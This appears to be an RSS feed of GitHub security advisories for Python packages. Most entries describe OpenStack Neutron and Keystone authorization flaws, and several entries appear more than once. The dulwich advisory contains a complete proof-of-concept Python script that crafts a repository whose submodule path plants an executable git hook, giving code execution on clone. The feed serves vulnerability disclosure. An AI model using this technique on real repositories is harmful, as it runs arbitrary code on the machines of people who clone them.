<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-07-02T19:07:08.768Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[neutron] OpenStack Neutron has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</id>
        <link href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9"/>
        <updated>2026-07-02T18:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenStack Neutron before 28.0.1, the tagging controller enforces plural policy action names on single-tag write operations while the defined policy rules use singular names. The mismatched names evaluate as allowed under the default policy, permitting a project reader to create and update tags on same-project resources. Deployments running Neutron 26.0.0 or later are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49299">https://nvd.nist.gov/vuln/detail/CVE-2026-49299</a></li>
<li><a href="https://bugs.launchpad.net/bugs/2150132">https://bugs.launchpad.net/bugs/2150132</a></li>
<li><a href="https://review.opendev.org/c/openstack/neutron/+/989099">https://review.opendev.org/c/openstack/neutron/+/989099</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/28/8">https://www.openwall.com/lists/oss-security/2026/05/28/8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/02/7">http://www.openwall.com/lists/oss-security/2026/06/02/7</a></li>
<li><a href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9">https://github.com/advisories/GHSA-xv24-hxh9-2hh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T00:38:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[neutron] OpenStack Neutron has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</id>
        <link href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9"/>
        <updated>2026-07-02T18:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenStack Neutron before 28.0.1, the tagging controller enforces plural policy action names on single-tag write operations while the defined policy rules use singular names. The mismatched names evaluate as allowed under the default policy, permitting a project reader to create and update tags on same-project resources. Deployments running Neutron 26.0.0 or later are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49299">https://nvd.nist.gov/vuln/detail/CVE-2026-49299</a></li>
<li><a href="https://bugs.launchpad.net/bugs/2150132">https://bugs.launchpad.net/bugs/2150132</a></li>
<li><a href="https://review.opendev.org/c/openstack/neutron/+/989099">https://review.opendev.org/c/openstack/neutron/+/989099</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/28/8">https://www.openwall.com/lists/oss-security/2026/05/28/8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/02/7">http://www.openwall.com/lists/oss-security/2026/06/02/7</a></li>
<li><a href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9">https://github.com/advisories/GHSA-xv24-hxh9-2hh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T00:38:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[neutron] OpenStack Neutron has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</id>
        <link href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9"/>
        <updated>2026-07-02T18:50:58.000Z</updated>
        <content type="html"><![CDATA[<p>In OpenStack Neutron before 28.0.1, the tagging controller enforces plural policy action names on single-tag write operations while the defined policy rules use singular names. The mismatched names evaluate as allowed under the default policy, permitting a project reader to create and update tags on same-project resources. Deployments running Neutron 26.0.0 or later are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49299">https://nvd.nist.gov/vuln/detail/CVE-2026-49299</a></li>
<li><a href="https://bugs.launchpad.net/bugs/2150132">https://bugs.launchpad.net/bugs/2150132</a></li>
<li><a href="https://review.opendev.org/c/openstack/neutron/+/989099">https://review.opendev.org/c/openstack/neutron/+/989099</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2026/05/28/8">https://www.openwall.com/lists/oss-security/2026/05/28/8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/06/02/7">http://www.openwall.com/lists/oss-security/2026/06/02/7</a></li>
<li><a href="https://github.com/advisories/GHSA-xv24-hxh9-2hh9">https://github.com/advisories/GHSA-xv24-hxh9-2hh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xv24-hxh9-2hh9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-29T00:38:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dulwich] Dulwich's submodule path traversal in porcelain.submodule_update / porcelain.clone(recurse_submodules=True) yields RCE via attacker-dropped .git/hooks payload]]></title>
        <id>https://github.com/advisories/GHSA-gfhv-vqv2-4544</id>
        <link href="https://github.com/advisories/GHSA-gfhv-vqv2-4544"/>
        <updated>2026-07-02T17:50:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>dulwich.porcelain.submodule_update</code>, and by extension <code>porcelain.clone(..., recurse_submodules=True)</code>, materializes attacker-controlled submodule paths from a crafted upstream repository without path validation. A malicious <code>.gitmodules</code> plus a matching tree gitlink whose <code>path</code> is <code>.git/hooks</code> (or any other directory inside the parent repository's <code>.git</code> directory) causes the attacker's submodule tree contents to be written directly into the victim's <code>.git/hooks/</code> directory, preserving executable mode bits. The dropped executables are then run by any subsequent <code>git</code> or <code>dulwich</code> command that invokes the matching hook, resulting in arbitrary code execution.</p>
<p>This is the dulwich equivalent of the upstream Git fixes for CVE-2024-32002 / CVE-2024-32004, which were never propagated into dulwich's separately implemented submodule porcelain.</p>
<h3 id="affected">Affected</h3>
<ul>
<li><strong>Package:</strong> <code>dulwich</code> (PyPI)</li>
<li><strong>Affected versions:</strong> <code>&gt;=0.23.2, &lt;1.2.5</code></li>
<li><strong>Affected platforms:</strong> all (Linux, macOS, Windows). Exploitation does not require a case-insensitive or NTFS filesystem, because the path written is a literal <code>.git/hooks</code> rather than a case- or short-name-aliased form.</li>
</ul>
<p>Affected entry points:</p>
<ul>
<li><code>dulwich.porcelain.submodule_update(repo, init=True, recursive=True)</code></li>
<li><code>dulwich.porcelain.clone(source, target, recurse_submodules=True)</code></li>
<li><code>dulwich submodule update</code> CLI / <code>dulwich clone --recurse-submodules</code> CLI</li>
</ul>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p>The submodule path from the tree's gitlink entry (and matching <code>.gitmodules</code>) is consumed without validation in <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L234"><code>dulwich/porcelain/submodule.py</code></a>.</p>
<p>The attacker-controlled <code>path</code> enters the loop from <code>iter_cached_submodules</code> (<a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L168"><code>submodule.py#L154-L168</code></a>):</p>
<pre><code class="language-python">for path, target_sha in submodules_to_update:
    path_str = (
        path.decode(DEFAULT_ENCODING) if isinstance(path, bytes) else path
    )

    submodule_name: bytes | None = None
    for sm_path, sm_url, sm_name in read_submodules(gitmodules_path):
        if sm_path == path:
            submodule_name = sm_name
            break

    if not submodule_name:
        continue
</code></pre>
<p>It flows unchecked into <code>os.path.join</code> and the filesystem (<a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L187-L188"><code>submodule.py#L187-L188</code></a>):</p>
<pre><code class="language-python">            submodule_path = os.path.join(r.path, path_str)
            submodule_git_dir = os.path.join(r.controldir(), "modules", path_str)
</code></pre>
<p>Finally, the attacker tree's contents are materialized into that directory via <code>build_index_from_tree</code> with no <code>validate_path_element</code> argument, defaulting to the lax validator (<a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L229-L234"><code>submodule.py#L229-L234</code></a>):</p>
<pre><code class="language-python">                    build_index_from_tree(
                        submodule_path,
                        sub_repo.index_path(),
                        sub_repo.object_store,
                        tree_id,
                    )
</code></pre>
<p>Three issues compound:</p>
<ol>
<li><code>path_str</code> originates from the parent repository's tree gitlink entry (attacker-controlled) and is never validated against <code>.git</code>, <code>..</code>, or other path-traversal patterns. The same value is read from the attacker-supplied <code>.gitmodules</code> blob via <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/config.py#L1637-L1665"><code>read_submodules</code></a>, which also performs no validation.</li>
<li><code>submodule_path = os.path.join(r.path, path_str)</code> therefore resolves to an attacker-chosen directory anywhere on disk (e.g. <code>&lt;worktree&gt;/.git/hooks</code>).</li>
<li><a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/index.py#L2034-L2044"><code>build_index_from_tree</code></a> is called without <code>validate_path_element</code>, so it defaults to <code>validate_path_element_default</code>, which only rejects literal <code>.git</code>, <code>.</code>, and <code>..</code>. It does not refuse a <code>root_path</code> that is itself inside the parent's <code>.git</code> directory, and it honors the attacker tree's file modes including executable bits (<code>0o100755</code>).</li>
</ol>
<h3 id="reachability">Reachability</h3>
<p>A direct production call path from a user invocation: <code>porcelain.clone(source, target, recurse_submodules=True)</code> at <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/__init__.py#L1548-L1551"><code>dulwich/porcelain/__init__.py:1548-1551</code></a> calls <code>submodule_update(repo, init=True, recursive=True)</code> once the parent clone completes, reaching the unsanitized loop at <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/porcelain/submodule.py#L154-L234"><code>submodule.py#L154-L234</code></a>.</p>
<p>The CLI command <code>dulwich clone --recurse-submodules &lt;url&gt;</code> reaches the same sink via <a href="https://github.com/jelmer/dulwich/blob/8efb7d19eac519cd7fac39e79ca354327897e133/dulwich/cli.py#L2131"><code>dulwich/cli.py:2131</code></a>.</p>
<p>Any service that exposes <code>porcelain.clone(..., recurse_submodules=True)</code> on attacker-supplied URLs is exposed: CI runners, repository import tools, package resolvers that use dulwich as a pure-Python git, and language-server "fetch dependency from git" features.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>End-to-end against pip-installed <code>dulwich==1.2.4</code>, demonstrating both the path-traversal primitive and the resulting code execution when the victim subsequently runs <code>git</code>. The payload writes a marker file rather than performing any destructive action.</p>
<pre><code class="language-python">import os, tempfile, subprocess
import dulwich.repo as r
import dulwich.porcelain as p
from dulwich.objects import Blob, Commit, Tree

WORKDIR = tempfile.mkdtemp(prefix="dulwich-poc-")
ATTACKER = os.path.join(WORKDIR, "att.git")
VICTIM_PARENT = os.path.join(WORKDIR, "vic_parent.git")
VICTIM_WT = os.path.join(WORKDIR, "vic_wt")
MARKER = os.path.join(WORKDIR, "marker")

# Attacker submodule contains a single file named "post-checkout"
# with mode 0755 and a benign shell payload that writes a marker file.
attacker = r.Repo.init_bare(ATTACKER, mkdir=True)
payload = b"#!/bin/sh\necho executed &gt; " + MARKER.encode() + b"\n"
pb = Blob.from_string(payload)
attacker.object_store.add_object(pb)
at = Tree()
at.add(b"post-checkout", 0o100755, pb.id)
attacker.object_store.add_object(at)
ac = Commit()
ac.tree = at.id
ac.author = ac.committer = b"a &lt;a@a&gt;"
ac.author_time = ac.commit_time = 0
ac.author_timezone = ac.commit_timezone = 0
ac.message = b"x"
attacker.object_store.add_object(ac)
attacker.refs[b"refs/heads/master"] = ac.id
attacker.refs.set_symbolic_ref(b"HEAD", b"refs/heads/master")

# Victim parent has a .gitmodules and a tree gitlink, both pointing at
# path ".git/hooks". The gitlink targets the attacker submodule commit.
victim = r.Repo.init_bare(VICTIM_PARENT, mkdir=True)
gitmod = (
    b'[submodule "evil"]\n'
    b'\tpath = .git/hooks\n'
    b'\turl = ' + ATTACKER.encode() + b'\n'
)
gmb = Blob.from_string(gitmod)
victim.object_store.add_object(gmb)
vt = Tree()
vt.add(b".gitmodules", 0o100644, gmb.id)
vt.add(b".git/hooks", 0o160000, ac.id)
victim.object_store.add_object(vt)
vc = Commit()
vc.tree = vt.id
vc.author = vc.committer = b"a &lt;a@a&gt;"
vc.author_time = vc.commit_time = 0
vc.author_timezone = vc.commit_timezone = 0
vc.message = b"v"
victim.object_store.add_object(vc)
victim.refs[b"refs/heads/master"] = vc.id
victim.refs.set_symbolic_ref(b"HEAD", b"refs/heads/master")

# Single victim call: clone with recurse_submodules=True
p.clone(VICTIM_PARENT, VICTIM_WT, recurse_submodules=True)

hook = os.path.join(VICTIM_WT, ".git", "hooks", "post-checkout")
assert os.path.exists(hook), "hook was not written"
assert os.stat(hook).st_mode &amp; 0o111, "hook is not executable"

# git running in the victim worktree then executes the dropped hook
subprocess.run(["git", "-C", VICTIM_WT, "checkout", "master"], check=True,
               capture_output=True)
assert os.path.exists(MARKER), "hook did not fire"
print("Code execution confirmed:", open(MARKER).read().strip())
</code></pre>
<p>The trigger surface is broader than this proof of concept: the dropped file fires for any matching hook name (<code>post-checkout</code>, <code>pre-commit</code>, <code>post-merge</code>, <code>post-rewrite</code>, <code>post-applypatch</code>, and others). dulwich itself executes several hooks (<code>pre-commit</code>, <code>commit-msg</code>, <code>post-commit</code>, <code>pre-receive</code>, <code>update</code>, <code>post-receive</code>; see <code>dulwich/hooks.py</code> and <code>dulwich/repo.py</code>), so a victim using only dulwich is also reachable without upstream Git.</p>
<h3 id="credit">Credit</h3>
<p>tonghuaroot</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jelmer/dulwich/security/advisories/GHSA-gfhv-vqv2-4544">https://github.com/jelmer/dulwich/security/advisories/GHSA-gfhv-vqv2-4544</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52726">https://nvd.nist.gov/vuln/detail/CVE-2026-52726</a></li>
<li><a href="https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5">https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5</a></li>
<li><a href="https://github.com/advisories/GHSA-gfhv-vqv2-4544">https://github.com/advisories/GHSA-gfhv-vqv2-4544</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gfhv-vqv2-4544</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-02T17:50:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone's federated token rescoping mechanism doesn't propagate the original token's expiry to the newly issued token]]></title>
        <id>https://github.com/advisories/GHSA-whqr-fgm5-x77q</id>
        <link href="https://github.com/advisories/GHSA-whqr-fgm5-x77q"/>
        <updated>2026-07-02T17:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone federated token rescoping mechanism does not propagate the original token's expiry to the newly issued token. When a federated user rescopes a token via POST /v3/auth/tokens, the handle_scoped_token() function in the mapped authentication plugin returns response data without an expires_at value. The token provider falls back to issuing a token with a fresh default TTL. By rescoping repeatedly before each token expires, a user can maintain access indefinitely, bypassing operator-configured token lifetime policies. This is a variant of CVE-2012-3426. Only deployments using federated identity (SAML2, OpenID Connect) are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44394">https://nvd.nist.gov/vuln/detail/CVE-2026-44394</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2150379">https://bugs.launchpad.net/keystone/+bug/2150379</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-whqr-fgm5-x77q">https://github.com/advisories/GHSA-whqr-fgm5-x77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whqr-fgm5-x77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone's federated token rescoping mechanism doesn't propagate the original token's expiry to the newly issued token]]></title>
        <id>https://github.com/advisories/GHSA-whqr-fgm5-x77q</id>
        <link href="https://github.com/advisories/GHSA-whqr-fgm5-x77q"/>
        <updated>2026-07-02T17:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone federated token rescoping mechanism does not propagate the original token's expiry to the newly issued token. When a federated user rescopes a token via POST /v3/auth/tokens, the handle_scoped_token() function in the mapped authentication plugin returns response data without an expires_at value. The token provider falls back to issuing a token with a fresh default TTL. By rescoping repeatedly before each token expires, a user can maintain access indefinitely, bypassing operator-configured token lifetime policies. This is a variant of CVE-2012-3426. Only deployments using federated identity (SAML2, OpenID Connect) are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44394">https://nvd.nist.gov/vuln/detail/CVE-2026-44394</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2150379">https://bugs.launchpad.net/keystone/+bug/2150379</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-whqr-fgm5-x77q">https://github.com/advisories/GHSA-whqr-fgm5-x77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whqr-fgm5-x77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone's federated token rescoping mechanism doesn't propagate the original token's expiry to the newly issued token]]></title>
        <id>https://github.com/advisories/GHSA-whqr-fgm5-x77q</id>
        <link href="https://github.com/advisories/GHSA-whqr-fgm5-x77q"/>
        <updated>2026-07-02T17:44:31.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone federated token rescoping mechanism does not propagate the original token's expiry to the newly issued token. When a federated user rescopes a token via POST /v3/auth/tokens, the handle_scoped_token() function in the mapped authentication plugin returns response data without an expires_at value. The token provider falls back to issuing a token with a fresh default TTL. By rescoping repeatedly before each token expires, a user can maintain access indefinitely, bypassing operator-configured token lifetime policies. This is a variant of CVE-2012-3426. Only deployments using federated identity (SAML2, OpenID Connect) are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-44394">https://nvd.nist.gov/vuln/detail/CVE-2026-44394</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2150379">https://bugs.launchpad.net/keystone/+bug/2150379</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-603.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-whqr-fgm5-x77q">https://github.com/advisories/GHSA-whqr-fgm5-x77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whqr-fgm5-x77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-q623-f4j4-p4xj</id>
        <link href="https://github.com/advisories/GHSA-q623-f4j4-p4xj"/>
        <updated>2026-07-02T17:44:17.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. When combined with an application credential impersonation vulnerability, an attacker with the member role on a project can escalate to admin by chaining unrestricted application credentials with Keystone trusts. The impersonated token carries the victim's identity, which passes the trustor validation check. Keystone then validates the delegated roles against the victim's actual role assignments in the database, not the roles on the requesting token. This allows the attacker to create a trust delegating the victim's admin role to themselves. The trust persists independently, and additional trusts and application credentials can be created to maintain access. All actions are logged under the victim's identity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43000">https://nvd.nist.gov/vuln/detail/CVE-2026-43000</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-43000">https://access.redhat.com/security/cve/CVE-2026-43000</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482826">https://bugzilla.redhat.com/show_bug.cgi?id=2482826</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-q623-f4j4-p4xj">https://github.com/advisories/GHSA-q623-f4j4-p4xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q623-f4j4-p4xj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-q623-f4j4-p4xj</id>
        <link href="https://github.com/advisories/GHSA-q623-f4j4-p4xj"/>
        <updated>2026-07-02T17:44:17.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. When combined with an application credential impersonation vulnerability, an attacker with the member role on a project can escalate to admin by chaining unrestricted application credentials with Keystone trusts. The impersonated token carries the victim's identity, which passes the trustor validation check. Keystone then validates the delegated roles against the victim's actual role assignments in the database, not the roles on the requesting token. This allows the attacker to create a trust delegating the victim's admin role to themselves. The trust persists independently, and additional trusts and application credentials can be created to maintain access. All actions are logged under the victim's identity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43000">https://nvd.nist.gov/vuln/detail/CVE-2026-43000</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-43000">https://access.redhat.com/security/cve/CVE-2026-43000</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482826">https://bugzilla.redhat.com/show_bug.cgi?id=2482826</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-q623-f4j4-p4xj">https://github.com/advisories/GHSA-q623-f4j4-p4xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q623-f4j4-p4xj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Incorrect Authorization issue]]></title>
        <id>https://github.com/advisories/GHSA-q623-f4j4-p4xj</id>
        <link href="https://github.com/advisories/GHSA-q623-f4j4-p4xj"/>
        <updated>2026-07-02T17:44:17.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. When combined with an application credential impersonation vulnerability, an attacker with the member role on a project can escalate to admin by chaining unrestricted application credentials with Keystone trusts. The impersonated token carries the victim's identity, which passes the trustor validation check. Keystone then validates the delegated roles against the victim's actual role assignments in the database, not the roles on the requesting token. This allows the attacker to create a trust delegating the victim's admin role to themselves. The trust persists independently, and additional trusts and application credentials can be created to maintain access. All actions are logged under the victim's identity.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43000">https://nvd.nist.gov/vuln/detail/CVE-2026-43000</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148477">https://bugs.launchpad.net/keystone/+bug/2148477</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-43000">https://access.redhat.com/security/cve/CVE-2026-43000</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482826">https://bugzilla.redhat.com/show_bug.cgi?id=2482826</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-43000.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-601.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-q623-f4j4-p4xj">https://github.com/advisories/GHSA-q623-f4j4-p4xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q623-f4j4-p4xj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T21:32:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[keystone] OpenStack Keystone has an Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-2r23-2g6v-2m5f</id>
        <link href="https://github.com/advisories/GHSA-2r23-2g6v-2m5f"/>
        <updated>2026-07-02T17:44:06.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Keystone before 29.0.2. The Keystone RBAC policy enforcer in enforce_call unconditionally merges the raw JSON request body into the policy enforcement dictionary via policy_dict.update(json_input.copy()), overwriting trusted target data that was previously set from database lookups. Because flask.request.get_json is called with force=True, this works regardless of Content-Type or HTTP method. Any authenticated user can inject arbitrary policy target attributes (e.g., user_id, project_id) into the request body to bypass RBAC checks and perform unauthorized operations on resources belonging to other users or projects. This was introduced in commit 5ea59f52 (Rocky/14.0.0).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42999">https://nvd.nist.gov/vuln/detail/CVE-2026-42999</a></li>
<li><a href="https://bugs.launchpad.net/keystone/+bug/2148398">https://bugs.launchpad.net/keystone/+bug/2148398</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-015.html">https://security.openstack.org/ossa/OSSA-2026-015.html</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2026-42999">https://access.redhat.com/security/cve/CVE-2026-42999</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2482840">https://bugzilla.redhat.com/show_bug.cgi?id=2482840</a></li>
<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42999.json</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/keystone/PYSEC-2026-600.yaml</a></li>
